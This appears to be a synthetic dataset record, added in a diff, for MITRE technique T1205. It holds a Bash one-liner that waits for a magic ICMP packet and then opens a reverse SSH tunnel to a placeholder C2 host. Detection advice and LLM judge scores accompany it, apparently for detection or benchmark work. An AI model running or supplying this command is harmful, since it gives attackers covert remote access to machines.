@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo timeout 60 tcpdump -ln -i eth0 'icmp and icmp[4:2]=0xbeef and icmp[6:2]=0x1234' -c 1 >/dev/null && ssh -N -R 22022:localhost:22 user@c2.example",
+  "explanation": "Listens (requires sudo) for a single ICMP echo with magic identifier and sequence values (0xBEEF/0x1234). When observed, establishes a reverse SSH tunnel to a C2, effectively using the ICMP as a covert trigger. Detection: flag tcpdump invocation by non-admin users; IDS for ICMP packets with unusual id/seq patterns; monitor for unsolicited reverse SSH tunnels.",
+  "rationale_steps": [
+    "Passively sniff the LAN for a specific ICMP magic packet (sudo needed).",
+    "Use the packet as a signal to start a reverse SSH port-forward.",
+    "Maintain a covert channel through the reverse tunnel.",
+    "Detect by auditing tcpdump usage and ICMP field anomalies preceding SSH reverse tunnels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9e1e4684-1bb34e3a",
+  "source_prompt_hash": "9e1e4684",
+  "timestamp_utc": "2025-09-30T05:53:05.592837Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid tcpdump/ssh flags, correct redirection, and proper use of && and timeout.",
+        "semantic_score": 4,
+        "semantic_justification": "It waits for an ICMP packet with specific id/seq and then establishes a reverse SSH tunnel consistent with traffic signaling, though it does not explicitly constrain ICMP type to echo and relies on sudo privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T13:00:43.450317Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for tcpdump and ssh, correct command chaining with &&, and appropriate redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by using a specific ICMP packet pattern (with magic values 0xBEEF/0x1234) as a covert trigger to establish a reverse SSH tunnel for command and control.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T13:00:46.904447Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and no impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its claimed intent by using a specific ICMP packet as a trigger to establish a reverse SSH C2 tunnel, which is a classic and operationally plausible example of Traffic Signaling (T1205).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T13:01:04.330951Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
